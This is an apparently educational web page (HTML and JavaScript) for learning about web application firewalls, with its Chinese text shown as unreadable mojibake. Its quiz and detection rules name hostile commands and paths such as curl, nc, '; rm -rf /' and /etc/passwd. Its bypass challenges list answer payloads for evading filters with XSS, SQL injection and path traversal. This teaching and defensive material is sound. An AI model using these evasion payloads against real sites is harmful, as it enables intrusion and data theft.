
                <div style="margin-top: 2rem; padding-top: 1.5rem; border-top: 1px solid var(--border);">
                    <h4 style="font-family: 'JetBrains Mono', monospace; font-size: 0.75rem; color: var(--amber); margin-bottom: 1rem;">// DEFENSE_RECOMMENDATIONS</h4>
                    <div id="challenge-defense" style="color: var(--text-secondary); font-size: 0.875rem;">
                        å®ŒæˆæŒ‘æˆ°å¾Œï¼Œé€™è£¡æœƒé¡¯ç¤ºå¦‚ä½•é˜²è­·é€™é¡ç¹éæŠ€è¡“ã€‚
                    </div>
                </div>
            </div>
        </section>

        <!-- Interactive Quiz Section -->
        <section id="quiz">
            <h2>å¯¦æˆ°ç·´ç¿’</h2>

            <div class="progress-container">
                <div class="progress-bar">
                    <div class="progress-fill" id="quiz-progress" style="width: 0%"></div>
                </div>
                <div class="progress-text">
                    <span>é€²åº¦</span>
                    <span id="quiz-score">0 / 5</span>
                </div>
            </div>

            <div class="quiz-container">
                <div id="quiz-content">
                    <!-- Quiz questions will be loaded here -->
                </div>
                <div style="display: flex; gap: 1rem; margin-top: 1.5rem;">
                    <button class="btn btn-secondary" id="prev-btn" onclick="prevQuestion()" disabled>ä¸Šä¸€é¡Œ</button>
                    <button class="btn btn-primary" id="next-btn" onclick="nextQuestion()">ä¸‹ä¸€é¡Œ</button>
                </div>
            </div>
        </section>

        <!-- Best Practices -->
        <section id="best-practices">
            <h2>WAF æœ€ä½³å¯¦è¸</h2>

            <div class="card-grid">
                <div class="card">
                    <h3><span class="icon">[LAYER]</span> åˆ†å±¤é˜²ç¦¦</h3>
                    <p>WAF åªæ˜¯é˜²ç·šä¹‹ä¸€ï¼Œæ‡‰çµåˆè¼¸å…¥é©—è­‰ã€åƒæ•¸åŒ–æŸ¥è©¢ã€CSP ç­‰å¤šå±¤é˜²è­·ã€‚</p>
                </div>
                <div class="card">
                    <h3><span class="icon">[LOG]</span> ç›£æ§èˆ‡æ—¥èªŒ</h3>
                    <p>æŒçºŒç›£æ§ WAF æ—¥èªŒï¼Œåˆ†ææ”»æ“Šæ¨¡å¼ï¼Œä¸¦èª¿æ•´è¦å‰‡ä»¥æ¸›å°‘èª¤å ±ã€‚</p>
                </div>
                <div class="card">
                    <h3><span class="icon">[SYNC]</span> å®šæœŸæ›´æ–°</h3>
                    <p>ä¿æŒ WAF è¦å‰‡é›†æ›´æ–°ï¼Œä»¥æ‡‰å°æ–°å‹æ”»æ“ŠæŠ€è¡“ã€‚</p>
                </div>
                <div class="card">
                    <h3><span class="icon">[TEST]</span> æ¸¬è©¦é©—è­‰</h3>
                    <p>åœ¨éƒ¨ç½²å‰é€²è¡Œå……åˆ†æ¸¬è©¦ï¼Œç¢ºä¿è¦å‰‡ä¸æœƒå½±éŸ¿æ­£å¸¸æ¥­å‹™æµé‡ã€‚</p>
                </div>
                <div class="card">
                    <h3><span class="icon">[CONF]</span> å¹³è¡¡å®‰å…¨èˆ‡å¯ç”¨æ€§</h3>
                    <p>è¦å‰‡éæ–¼åš´æ ¼æœƒå°è‡´èª¤å ±ï¼Œéæ–¼å¯¬é¬†å‰‡ç„¡æ³•æœ‰æ•ˆé˜²è­·ï¼Œéœ€æ‰¾åˆ°å¹³è¡¡é»ã€‚</p>
                </div>
                <div class="card">
                    <h3><span class="icon">[RULE]</span> è‡ªè¨‚è¦å‰‡</h3>
                    <p>æ ¹æ“šæ‡‰ç”¨ç¨‹å¼ç‰¹æ€§ï¼Œè‡ªè¨‚å°ˆå±¬è¦å‰‡ä»¥æä¾›æ›´ç²¾æº–çš„ä¿è­·ã€‚</p>
                </div>
            </div>
        </section>

        <!-- Resources -->
        <section id="resources">
            <h2>å»¶ä¼¸è³‡æº</h2>
            <div class="card">
                <h3><span class="icon">[REF]</span> æ¨è–¦å­¸ç¿’è³‡æº</h3>
                <ul style="color: var(--text-secondary); margin-top: 1rem; padding-left: 1.5rem; list-style: none;">
                    <li style="margin-bottom: 0.75rem;"><span style="color: var(--text-dim); margin-right: 0.5rem;">-></span><a href="https://owasp.org/www-project-web-security-testing-guide/" target="_blank" style="color: var(--phosphor);">OWASP Web Security Testing Guide</a></li>
                    <li style="margin-bottom: 0.75rem;"><span style="color: var(--text-dim); margin-right: 0.5rem;">-></span><a href="https://owasp.org/www-project-modsecurity-core-rule-set/" target="_blank" style="color: var(--phosphor);">OWASP ModSecurity Core Rule Set</a></li>
                    <li style="margin-bottom: 0.75rem;"><span style="color: var(--text-dim); margin-right: 0.5rem;">-></span><a href="https://portswigger.net/web-security" target="_blank" style="color: var(--phosphor);">PortSwigger Web Security Academy</a></li>
                    <li style="margin-bottom: 0.75rem;"><span style="color: var(--text-dim); margin-right: 0.5rem;">-></span><a href="https://github.com/payloadbox" target="_blank" style="color: var(--phosphor);">PayloadBox - Payload æ”¶é›†</a></li>
                </ul>
            </div>
        </section>
    </div>

    <!-- Footer -->
    <footer>
        <p>What The WAF - WAF å­¸ç¿’å¹³å°</p>
        <p style="margin-top: 0.5rem;">åƒ…ä¾›æ•™è‚²å­¸ç¿’ç”¨é€”ï¼Œè«‹å‹¿ç”¨æ–¼éæ³•æ´»å‹•</p>
    </footer>

    <script>
        // Tab switching
        document.querySelectorAll('.tab').forEach(tab => {
            tab.addEventListener('click', () => {
                const tabId = tab.dataset.tab;

                // Update tab buttons
                document.querySelectorAll('.tab').forEach(t => t.classList.remove('active'));
                tab.classList.add('active');

                // Update tab content
                document.querySelectorAll('.tab-content').forEach(content => {
                    content.classList.remove('active');
                });
                document.getElementById(tabId).classList.add('active');
            });
        });

        // Accordion
        function toggleAccordion(header) {
            const accordion = header.parentElement;
            accordion.classList.toggle('active');
        }

        // WAF Detection Simulator
        const wafRules = [
            { pattern: /('|"|;|--|#|\/\*|\*\/)/i, type: 'SQL Injection', desc: 'åµæ¸¬åˆ° SQL ç‰¹æ®Šå­—ç¬¦' },
            { pattern: /(union\s+select|select\s+.*\s+from|insert\s+into|delete\s+from|drop\s+table|update\s+.*\s+set)/i, type: 'SQL Injection', desc: 'åµæ¸¬åˆ° SQL é—œéµå­—çµ„åˆ' },
            { pattern: /(or|and)\s+[\d\w]+\s*=\s*[\d\w]+/i, type: 'SQL Injection', desc: 'åµæ¸¬åˆ°é‚è¼¯ç¹éå˜—è©¦' },
            { pattern: /(<script|javascript:|on\w+\s*=|<iframe|<img\s+[^>]*onerror)/i, type: 'XSS', desc: 'åµæ¸¬åˆ° XSS æ”»æ“Šæ¨¡å¼' },
            { pattern: /<svg[^>]*onload/i, type: 'XSS', desc: 'åµæ¸¬åˆ° SVG XSS æ”»æ“Š' },
            { pattern: /(;|\||&&|\$\(|`)\s*(ls|cat|whoami|id|pwd|wget|curl|bash|sh|nc|netcat)/i, type: 'Command Injection', desc: 'åµæ¸¬åˆ°å‘½ä»¤æ³¨å…¥' },
            { pattern: /(\.\.|%2e%2e|%252e%252e)/i, type: 'Path Traversal', desc: 'åµæ¸¬åˆ°è·¯å¾‘ç©¿è¶Š' },
            { pattern: /(\/etc\/passwd|\/etc\/shadow|\/windows\/system32)/i, type: 'Path Traversal', desc: 'åµæ¸¬åˆ°æ•æ„Ÿæª”æ¡ˆå­˜å–' },
            { pattern: /(127\.0\.0\.1|localhost|169\.254\.169\.254|0\.0\.0\.0)/i, type: 'SSRF', desc: 'åµæ¸¬åˆ°å…§éƒ¨ä½å€å­˜å–' },
        ];

        function checkWAF() {
            const input = document.getElementById('waf-input').value;
            const resultDiv = document.getElementById('waf-result');

            if (!input.trim()) {
                resultDiv.innerHTML = '';
                return;
            }

            let detections = [];

            for (const rule of wafRules) {
                if (rule.pattern.test(input)) {
                    detections.push(rule);
                }
            }

            if (detections.length > 0) {
                resultDiv.innerHTML = `
                    <div class="detection-result detection-blocked">
                        <strong style="color: var(--danger); font-family: 'JetBrains Mono', monospace; font-size: 0.875rem;">[BLOCKED] è«‹æ±‚è¢«é˜»æ“‹</strong>
                        <p style="margin-top: 0.5rem; color: var(--text-secondary); font-size: 0.875rem;">åµæ¸¬åˆ°ä»¥ä¸‹å¨è„…ï¼š</p>
                        <ul style="margin-top: 0.5rem; padding-left: 1.5rem; list-style: none;">
                            ${detections.map(d => `<li style="color: var(--danger); font-family: 'JetBrains Mono', monospace; font-size: 0.8125rem; margin-bottom: 0.25rem;"><span style="color: var(--text-dim);">></span> ${d.type}: ${d.desc}</li>`).join('')}
                        </ul>
                    </div>
                `;
            } else {
                resultDiv.innerHTML = `
                    <div class="detection-result detection-allowed">
                        <strong style="color: var(--phosphor); font-family: 'JetBrains Mono', monospace; font-size: 0.875rem;">[ALLOWED] è«‹æ±‚é€šé</strong>
                        <p style="margin-top: 0.5rem; color: var(--text-secondary); font-size: 0.875rem;">æœªåµæ¸¬åˆ°å·²çŸ¥æ”»æ“Šæ¨¡å¼</p>
                    </div>
                `;
            }
        }

        function setPayload(payload) {
            document.getElementById('waf-input').value = payload;
            checkWAF();
        }

        // Setup payload buttons with data attributes
        document.querySelectorAll('[data-payload]').forEach(btn => {
            btn.addEventListener('click', function() {
                setPayload(this.dataset.payload);
            });
        });

        // HTML escape helper function
        function escapeHtml(text) {
            const div = document.createElement('div');
            div.textContent = text;
            return div.innerHTML;
        }

        // Quiz System
        const quizQuestions = [
            {
                question: 'ä»¥ä¸‹å“ªå€‹æ˜¯ SQL Injection æ”»æ“Š?',
                code: null,
                options: [
                    "SELECT * FROM users WHERE id=1",
                    "' OR '1'='1",
                    "<script>alert(1)<\/script>",
                    "../../../etc/passwd"
                ],
                correct: 1,
                explanation: "' OR '1'='1 æ˜¯å…¸å‹çš„ SQL æ³¨å…¥ payloadï¼Œç”¨æ–¼ç¹éèªè­‰ã€‚"
            },
            {
                question: 'ä»¥ä¸‹å“ªå€‹ payload å˜—è©¦é€²è¡Œ XSS æ”»æ“Š?',
                code: null,
                options: [
                    "UNION SELECT password FROM users",
                    "; rm -rf /",
                    "<img src=x onerror=alert(1)>",
                    "http://169.254.169.254/"
                ],
                correct: 2,
                explanation: "<img src=x onerror=alert(1)> åˆ©ç”¨åœ–ç‰‡è¼‰å…¥å¤±æ•—æ™‚è§¸ç™¼ JavaScriptï¼Œæ˜¯å¸¸è¦‹çš„ XSS æ”»æ“Šã€‚"
            },
            {
                question: 'ModSecurity è¦å‰‡ä¸­ï¼Œå“ªå€‹éšæ®µç”¨æ–¼æª¢æŸ¥è«‹æ±‚ä¸»é«” (Request Body)?',
                code: null,
                options: [
                    "phase:1",
                    "phase:2",
                    "phase:3",
                    "phase:4"
                ],
                correct: 1,
                explanation: "phase:2 æ˜¯è«‹æ±‚ä¸»é«”éšæ®µï¼Œç”¨æ–¼æª¢æŸ¥ POST è³‡æ–™ç­‰è«‹æ±‚å…§å®¹ã€‚"
            },
            {
                question: 'ä»¥ä¸‹å“ªç¨®æŠ€è¡“ä¸æ˜¯ WAF ç¹éæ–¹æ³•?',
                code: null,
                options: [
                    "å¤§å°å¯«è®Šæ› (Case Variation)",
                    "URL ç·¨ç¢¼ (URL Encoding)",
                    "åƒæ•¸åŒ–æŸ¥è©¢ (Parameterized Queries)",
                    "è¨»è§£æ’å…¥ (Comment Injection)"
                ],
                correct: 2,
                explanation: "åƒæ•¸åŒ–æŸ¥è©¢æ˜¯é˜²ç¦¦ SQL Injection çš„æ–¹æ³•ï¼Œä¸æ˜¯ç¹é WAF çš„æŠ€è¡“ã€‚"
            },
            {
                question: 'åµæ¸¬åˆ° http://169.254.169.254/latest/meta-data/ é€™å€‹è«‹æ±‚ï¼Œæœ€å¯èƒ½æ˜¯ä»€éº¼é¡å‹çš„æ”»æ“Š?',
                code: null,
                options: [
                    "SQL Injection",
                    "XSS",
                    "SSRF (Server-Side Request Forgery)",
                    "Path Traversal"
                ],
                correct: 2,
                explanation: "169.254.169.254 æ˜¯ AWS EC2 ç­‰é›²ç«¯æœå‹™çš„ metadata endpointï¼Œæ”»æ“Šè€…é€é SSRF å˜—è©¦å­˜å–é›²ç«¯å¯¦ä¾‹çš„æ•æ„Ÿè³‡è¨Šã€‚"
            }
        ];

        let currentQuestion = 0;
        let answers = new Array(quizQuestions.length).fill(null);

        function loadQuestion() {
            const question = quizQuestions[currentQuestion];
            const content = document.getElementById('quiz-content');

            let optionsHtml = question.options.map((option, index) => {
                let className = 'quiz-option';
                if (answers[currentQuestion] !== null) {
                    if (index === question.correct) {
                        className += ' correct';
                    } else if (index === answers[currentQuestion] && answers[currentQuestion] !== question.correct) {
                        className += ' incorrect';
                    }
                }
                return `<div class="${className}" onclick="selectAnswer(${index})">${escapeHtml(option)}</div>`;
            }).join('');

            let explanationHtml = '';
            if (answers[currentQuestion] !== null) {
                explanationHtml = `
                    <div class="result-box show ${answers[currentQuestion] === question.correct ? 'result-success' : 'result-error'}">
                        <span style="font-family: 'JetBrains Mono', monospace; font-weight: 600;">${answers[currentQuestion] === question.correct ? '[CORRECT]' : '[INCORRECT]'}</span>
                        ${question.explanation}
                    </div>
                `;
            }

            content.innerHTML = `
                <div class="quiz-question">
                    <h4>å•é¡Œ ${currentQuestion + 1} / ${quizQuestions.length}</h4>
                    <p style="margin-top: 0.5rem; margin-bottom: 1rem; font-size: 1.1rem;">${question.question}</p>
                    ${question.code ? `<div class="code-block"><code>${question.code}</code></div>` : ''}
                    <div class="quiz-options">
                        ${optionsHtml}
                    </div>
                    ${explanationHtml}
                </div>
            `;

            // Update navigation buttons
            document.getElementById('prev-btn').disabled = currentQuestion === 0;
            document.getElementById('next-btn').textContent =
                currentQuestion === quizQuestions.length - 1 ? 'å®Œæˆ' : 'ä¸‹ä¸€é¡Œ';

            updateProgress();
        }

        function selectAnswer(index) {
            if (answers[currentQuestion] !== null) return; // Already answered

            answers[currentQuestion] = index;
            loadQuestion();
        }

        function nextQuestion() {
            if (currentQuestion < quizQuestions.length - 1) {
                currentQuestion++;
                loadQuestion();
            } else {
                showResults();
            }
        }

        function prevQuestion() {
            if (currentQuestion > 0) {
                currentQuestion--;
                loadQuestion();
            }
        }

        function updateProgress() {
            const answered = answers.filter(a => a !== null).length;
            const correct = answers.filter((a, i) => a === quizQuestions[i].correct).length;

            document.getElementById('quiz-progress').style.width =
                `${(answered / quizQuestions.length) * 100}%`;
            document.getElementById('quiz-score').textContent =
                `${correct} / ${quizQuestions.length}`;
        }

        function showResults() {
            const correct = answers.filter((a, i) => a === quizQuestions[i].correct).length;
            const total = quizQuestions.length;
            const percentage = Math.round((correct / total) * 100);

            let message = '';
            let statusClass = '';
            if (percentage >= 80) {
                message = 'ä½ å° WAF æœ‰å¾ˆå¥½çš„ç†è§£ï¼';
                statusClass = 'color: var(--phosphor);';
            } else if (percentage >= 60) {
                message = 'ä¸éŒ¯ï¼ç¹¼çºŒå­¸ç¿’å¯ä»¥æ›´ä¸Šä¸€å±¤æ¨“ï¼';
                statusClass = 'color: var(--amber);';
            } else {
                message = 'å»ºè­°å†è¤‡ç¿’ä¸€ä¸‹ä¸Šé¢çš„å…§å®¹ï¼';
                statusClass = 'color: var(--danger);';
            }

            document.getElementById('quiz-content').innerHTML = `
                <div style="text-align: center; padding: 2rem;">
                    <h3 style="font-family: 'JetBrains Mono', monospace; font-size: 0.875rem; color: var(--text-dim); margin-bottom: 1rem; text-transform: uppercase; letter-spacing: 0.1em;">// QUIZ_COMPLETE</h3>
                    <p style="font-family: 'JetBrains Mono', monospace; font-size: 4rem; margin-bottom: 1rem; ${statusClass}">${percentage}%</p>
                    <p style="font-family: 'JetBrains Mono', monospace; color: var(--text-secondary); margin-bottom: 1rem; font-size: 0.875rem;">
                        æ­£ç¢º: ${correct} / ${total}
                    </p>
                    <p style="font-size: 1rem; color: var(--text-primary);">${message}</p>
                    <button class="btn btn-primary" onclick="resetQuiz()" style="margin-top: 1.5rem;">
                        $ ./retry
                    </button>
                </div>
            `;
        }

        function resetQuiz() {
            currentQuestion = 0;
            answers = new Array(quizQuestions.length).fill(null);
            loadQuestion();
        }

        // Smooth scroll
        document.querySelectorAll('a[href^="#"]').forEach(anchor => {
            anchor.addEventListener('click', function (e) {
                e.preventDefault();
                const target = document.querySelector(this.getAttribute('href'));
                if (target) {
                    target.scrollIntoView({
                        behavior: 'smooth',
                        block: 'start'
                    });
                }
            });
        });

        // Initialize quiz
        loadQuestion();

        // Add scroll animation
        const observer = new IntersectionObserver((entries) => {
            entries.forEach(entry => {
                if (entry.isIntersecting) {
                    entry.target.classList.add('animate-in');
                }
            });
        }, { threshold: 0.1 });

        document.querySelectorAll('.card, .accordion, .rule-demo, .quiz-container, .challenge-container, .score-calculator').forEach(el => {
            observer.observe(el);
        });

        // ========================================
        // ENCODER/DECODER TOOL
        // ========================================
        let currentEncodeType = 'url';

        // Encoder type selection
        document.querySelectorAll('.encoder-type-btn').forEach(btn => {
            btn.addEventListener('click', function() {
                document.querySelectorAll('.encoder-type-btn').forEach(b => b.classList.remove('active'));
                this.classList.add('active');
                currentEncodeType = this.dataset.encode;
                // Auto-encode if there's input
                if (document.getElementById('encoder-input').value) {
                    encodePayload();
                }
            });
        });

        function encodePayload() {
            const input = document.getElementById('encoder-input').value;
            const output = document.getElementById('encoder-output');
            const log = document.getElementById('encoder-log');

            if (!input) {
                output.value = '';
                return;
            }

            let result = '';
            let logMessage = '';

            switch (currentEncodeType) {
                case 'url':
                    result = encodeURIComponent(input);
                    logMessage = `<span class="cmd">$ urlencode</span> "${escapeHtml(input.substring(0, 30))}${input.length > 30 ? '...' : ''}"`;
                    break;
                case 'base64':
                    try {
                        result = btoa(unescape(encodeURIComponent(input)));
                        logMessage = `<span class="cmd">$ base64</span> -e`;
                    } catch (e) {
                        result = '[ERROR] ç„¡æ³•ç·¨ç¢¼';
                        logMessage = `<span class="error">[ERROR]</span> Base64 ç·¨ç¢¼å¤±æ•—`;
                    }
                    break;
                case 'html':
                    result = input.split('').map(c => {
                        const code = c.charCodeAt(0);
                        if (code > 127 || '<>&"\''.includes(c)) {
                            return `&#${code};`;
                        }
                        return c;
                    }).join('');
                    logMessage = `<span class="cmd">$ htmlencode</span> --entities`;
                    break;
                case 'unicode':
                    result = input.split('').map(c => {
                        const hex = c.charCodeAt(0).toString(16).padStart(4, '0');
                        return `\\u${hex}`;
                    }).join('');
                    logMessage = `<span class="cmd">$ unicode</span> --escape`;
                    break;
                case 'double':
                    result = encodeURIComponent(encodeURIComponent(input));
                    logMessage = `<span class="cmd">$ urlencode</span> --double`;
                    break;
            }

            output.value = result;
            log.innerHTML = logMessage + `<br><span class="success">[OK]</span> ç·¨ç¢¼å®Œæˆï¼Œé•·åº¦: ${result.length}`;
            log.style.display = 'block';
        }

        function decodePayload() {
            const input = document.getElementById('encoder-output').value;
            const output = document.getElementById('encoder-input');
            const log = document.getElementById('encoder-log');

            if (!input) return;

            let result = '';
            let logMessage = '';

            switch (currentEncodeType) {
                case 'url':
                    try {
                        result = decodeURIComponent(input);
                        logMessage = `<span class="cmd">$ urldecode</span>`;
                    } catch (e) {
                        result = '[ERROR] ç„¡æ³•è§£ç¢¼';
                        logMessage = `<span class="error">[ERROR]</span> URL è§£ç¢¼å¤±æ•—`;
                    }
                    break;
                case 'base64':
                    try {
                        result = decodeURIComponent(escape(atob(input)));
                        logMessage = `<span class="cmd">$ base64</span> -d`;
                    } catch (e) {
                        result = '[ERROR] ç„¡æ³•è§£ç¢¼';
                        logMessage = `<span class="error">[ERROR]</span> Base64 è§£ç¢¼å¤±æ•—`;
                    }
                    break;
                case 'html':
                    const textarea = document.createElement('textarea');
                    textarea.innerHTML = input;
                    result = textarea.value;
                    logMessage = `<span class="cmd">$ htmldecode</span>`;
                    break;
                case 'unicode':
                    try {
                        result = input.replace(/\\u([0-9a-fA-F]{4})/g, (_, hex) =>
                            String.fromCharCode(parseInt(hex, 16))
                        );
                        logMessage = `<span class="cmd">$ unicode</span> --unescape`;
                    } catch (e) {
                        result = '[ERROR] ç„¡æ³•è§£ç¢¼';
                    }
                    break;
                case 'double':
                    try {
                        result = decodeURIComponent(decodeURIComponent(input));
                        logMessage = `<span class="cmd">$ urldecode</span> --double`;
                    } catch (e) {
                        result = '[ERROR] ç„¡æ³•è§£ç¢¼';
                        logMessage = `<span class="error">[ERROR]</span> é›™é‡è§£ç¢¼å¤±æ•—`;
                    }
                    break;
            }

            output.value = result;
            log.innerHTML = logMessage + `<br><span class="success">[OK]</span> è§£ç¢¼å®Œæˆ`;
            log.style.display = 'block';
        }

        function swapEncoder() {
            const input = document.getElementById('encoder-input');
            const output = document.getElementById('encoder-output');
            const temp = input.value;
            input.value = output.value;
            output.value = temp;
        }

        function clearEncoder() {
            document.getElementById('encoder-input').value = '';
            document.getElementById('encoder-output').value = '';
            document.getElementById('encoder-log').style.display = 'none';
        }

        function setEncoderInput(value) {
            document.getElementById('encoder-input').value = value;
            encodePayload();
        }

        // ========================================
        // SCORE CALCULATOR
        // ========================================
        function toggleViolation(item) {
            item.classList.toggle('checked');
            updateScore();
        }

        function updateScore() {
            let total = 0;
            document.querySelectorAll('.violation-item.checked').forEach(item => {
                total += parseInt(item.dataset.score);
            });

            const scoreNumber = document.getElementById('score-number');
            const scoreStatus = document.getElementById('score-status');
            const scoreDisplay = document.getElementById('score-display');

            scoreNumber.textContent = total;
            scoreDisplay.classList.remove('warning', 'blocked');

            if (total >= 4) {
                scoreStatus.innerHTML = '<span style="color: var(--danger);">[BLOCKED]</span> VIOL_RATING_THREAT è§¸ç™¼';
                scoreDisplay.classList.add('blocked');
            } else if (total >= 3) {
                scoreStatus.innerHTML = '<span style="color: var(--amber);">[WARNING]</span> æ¥è¿‘é–¾å€¼';
                scoreDisplay.classList.add('warning');
            } else {
                scoreStatus.innerHTML = '<span style="color: var(--phosphor);">[ALLOWED]</span> è«‹æ±‚æ”¾è¡Œ';
            }
        }

        function resetScoreCalculator() {
            document.querySelectorAll('.violation-item.checked').forEach(item => {
                item.classList.remove('checked');
            });
            updateScore();
        }

        function simulateApiClient() {
            resetScoreCalculator();
            // Simulate: BOT_CLIENT + HTTP_RESPONSE_STATUS (429) + ENCODING
            const items = document.querySelectorAll('.violation-item');
            items[0].classList.add('checked'); // BOT_CLIENT
            items[2].classList.add('checked'); // HTTP_RESPONSE_STATUS
            items[3].classList.add('checked'); // ENCODING
            updateScore();
        }

        function simulateAttack() {
            resetScoreCalculator();
            // Simulate: ATTACK_SIGNATURE
            const items = document.querySelectorAll('.violation-item');
            items[6].classList.add('checked'); // ATTACK_SIGNATURE
            updateScore();
        }

        // ========================================
        // BYPASS CHALLENGE
        // ========================================
        const challenges = [
            {
                level: 1,
                title: 'å¤§å°å¯«ç¹é',
                description: 'é€™å€‹ WAF è¦å‰‡æœƒé˜»æ“‹åŒ…å« "script" çš„è«‹æ±‚ã€‚ä½ çš„ä»»å‹™æ˜¯è®“ XSS payload é€šéæª¢æ¸¬ã€‚',
                blocked: '<script>alert(1)</script>',
                goal: 'è®“åŒ…å« script æ¨™ç±¤çš„ XSS payload é€šé WAF',
                hint: 'WAF è¦å‰‡å¯èƒ½æ˜¯å¤§å°å¯«æ•æ„Ÿçš„ã€‚è©¦è©¦æ”¹è®Šå­—æ¯çš„å¤§å°å¯«ã€‚',
                rule: /script/i,
                validate: (input) => {
                    // Must contain script tag functionality but bypass case-sensitive check
                    const hasScript = /<script/i.test(input) || /javascript:/i.test(input);
                    const bypassesRule = !(/script/.test(input)); // Only lowercase blocked
                    return hasScript && bypassesRule;
                },
                defense: 'ä½¿ç”¨å¤§å°å¯«ä¸æ•æ„Ÿçš„æ­£å‰‡è¡¨é”å¼ (?i)ï¼Œä¾‹å¦‚ï¼š<code>/(&lt;script|javascript:)/i</code>',
                answers: ['<SCRIPT>alert(1)</SCRIPT>', '<ScRiPt>alert(1)</ScRiPt>', '<Script>alert(1)</Script>']
            },
            {
                level: 2,
                title: 'URL ç·¨ç¢¼ç¹é',
                description: 'WAF é˜»æ“‹äº†è·¯å¾‘ç©¿è¶Šæ”»æ“Š "../"ã€‚ä½†æœ‰äº› WAF ä¸æœƒè§£ç¢¼ URL ç·¨ç¢¼å¾Œå†æª¢æŸ¥ã€‚',
                blocked: '../../../etc/passwd',
                goal: 'ä½¿ç”¨ URL ç·¨ç¢¼è®“è·¯å¾‘ç©¿è¶Š payload é€šé',
                hint: '../ çš„ URL ç·¨ç¢¼æ˜¯ %2e%2e%2fã€‚è©¦è‘—ç·¨ç¢¼é—œéµå­—å…ƒã€‚',
                rule: /\.\.\//,
                validate: (input) => {
                    // Must decode to path traversal but not contain literal ../
                    try {
                        const decoded = decodeURIComponent(input);
                        return decoded.includes('../') && !input.includes('../');
                    } catch {
                        return false;
                    }
                },
                defense: 'åœ¨æª¢æ¸¬å‰å…ˆé€²è¡Œ URL è§£ç¢¼ï¼Œä¸¦é€²è¡Œå¤šå±¤è§£ç¢¼ä»¥é˜²æ­¢é›™é‡ç·¨ç¢¼æ”»æ“Š',
                answers: ['%2e%2e%2f%2e%2e%2f%2e%2e%2fetc/passwd', '%2e%2e/', '..%2f']
            },
            {
                level: 3,
                title: 'SQL è¨»è§£ç¹é',
                description: 'WAF é˜»æ“‹ "UNION SELECT"ã€‚æ”»æ“Šè€…å¯ä»¥ç”¨ SQL è¨»è§£ä¾†åˆ†å‰²é—œéµå­—ã€‚',
                blocked: 'UNION SELECT',
                goal: 'ç”¨ SQL è¨»è§£åˆ†å‰²é—œéµå­—ï¼Œç¹éç©ºæ ¼åŒ¹é…',
                hint: 'SQL æ”¯æ´ /**/ ä½œç‚ºè¨»è§£ã€‚å¯ä»¥ç”¨å®ƒä¾†å–ä»£ç©ºæ ¼ã€‚',
                rule: /union\s+select/i,
                validate: (input) => {
                    // Must contain union and select but not with just whitespace
                    const hasUnion = /union/i.test(input);
                    const hasSelect = /select/i.test(input);
                    const noDirectSpace = !/union\s+select/i.test(input);
                    const hasComment = /\/\*.*\*\//.test(input);
                    return hasUnion && hasSelect && noDirectSpace && hasComment;
                },
                defense: 'ç§»é™¤ SQL è¨»è§£å¾Œå†é€²è¡Œæª¢æ¸¬ï¼š<code>input.replace(/\\/\\*.*?\\*\\//g, " ")</code>',
                answers: ['UNION/**/SELECT', 'UNION/*foo*/SELECT', 'UN/**/ION/**/SEL/**/ECT']
            },
            {
                level: 4,
                title: 'HTML æ¨™ç±¤è®Šå½¢',
                description: 'WAF é˜»æ“‹ <img å’Œ onerrorã€‚ä½† HTML è§£æå™¨å°æ–¼æ¨™ç±¤æ ¼å¼å¾ˆå¯¬å®¹ã€‚',
                blocked: '<img src=x onerror=alert(1)>',
                goal: 'ä½¿ç”¨ HTML è§£æå™¨çš„å¯¬å®¹ç‰¹æ€§ç¹éæª¢æ¸¬',
                hint: 'è©¦è©¦åœ¨æ¨™ç±¤åç¨±å¾ŒåŠ å…¥ç‰¹æ®Šå­—å…ƒå¦‚ / æˆ–æ›è¡Œã€‚ä¾‹å¦‚ï¼š<img/src=x>',
                rule: /<img\s+.*onerror/i,
                validate: (input) => {
                    // Must be valid XSS but bypass the specific pattern
                    const hasImg = /<img/i.test(input);
                    const hasOnerror = /onerror/i.test(input);
                    const bypassesRule = !/<img\s+.*onerror/i.test(input);
                    return hasImg && hasOnerror && bypassesRule;
                },
                defense: 'ä½¿ç”¨æ›´åš´æ ¼çš„ HTML è§£ææˆ–ç™½åå–®æ–¹å¼ï¼Œè€Œéé»‘åå–®æ­£å‰‡',
                answers: ['<img/src=x onerror=alert(1)>', '<img\nsrc=x onerror=alert(1)>', '<img\tsrc=x onerror=alert(1)>']
            },
            {
                level: 5,
                title: 'é€²éšï¼šå¤šé‡æŠ€è¡“çµ„åˆ',
                description: 'WAF åŒæ™‚æª¢æ¸¬ SQL é—œéµå­—å’Œç‰¹æ®Šå­—å…ƒã€‚ä½ éœ€è¦çµ„åˆå¤šç¨®ç¹éæŠ€è¡“ã€‚',
                blocked: "' OR 1=1--",
                goal: 'çµ„åˆç·¨ç¢¼å’Œè®Šå½¢æŠ€è¡“ï¼Œç¹éå¤šé‡æª¢æ¸¬',
                hint: 'å¯ä»¥çµ„åˆï¼šå¤§å°å¯«è®Šæ›ã€ç·¨ç¢¼ã€è¨»è§£ã€ç©ºç™½å­—å…ƒè®Šæ›ç­‰æŠ€è¡“ã€‚',
                rule: /('|or\s+\d+\s*=\s*\d+|--)/i,
                validate: (input) => {
                    // Complex validation - must achieve SQL injection effect without triggering rules
                    const hasBypassAttempt = (
                        /%27/i.test(input) || // encoded quote
                        /%6f%72/i.test(input) || // encoded OR
                        /\/\*/.test(input) || // SQL comment
                        /\|\|/.test(input) // OR alternative
                    );
                    const notDirectMatch = !(/('|or\s+\d+\s*=\s*\d+|--)/i.test(input));
                    return hasBypassAttempt && notDirectMatch;
                },
                defense: 'å¤šå±¤è§£ç¢¼ + æ­£è¦åŒ– + èªæ„åˆ†æï¼Œè€Œéåƒ…é æ­£å‰‡è¡¨é”å¼åŒ¹é…',
                answers: ['%27%20OR%201=1%23', "' || 1=1/*", '%27%20%4f%52%201=1--']
            }
        ];

        let currentChallenge = 0;
        let completedChallenges = new Set();

        // Challenge level buttons
        document.querySelectorAll('.level-btn').forEach(btn => {
            btn.addEventListener('click', function() {
                document.querySelectorAll('.level-btn').forEach(b => b.classList.remove('active'));
                this.classList.add('active');
                currentChallenge = parseInt(this.dataset.level);
                loadChallenge();
            });
        });

        function loadChallenge() {
            const challenge = challenges[currentChallenge];
            document.getElementById('challenge-description').textContent = challenge.description;
            document.getElementById('challenge-target').textContent = challenge.blocked;
            document.getElementById('challenge-goal').textContent = challenge.goal;
            document.getElementById('challenge-hint').textContent = challenge.hint;
            document.getElementById('challenge-hint').classList.remove('show');
            document.getElementById('challenge-input').value = '';
            document.getElementById('challenge-result').classList.remove('show', 'success', 'fail');
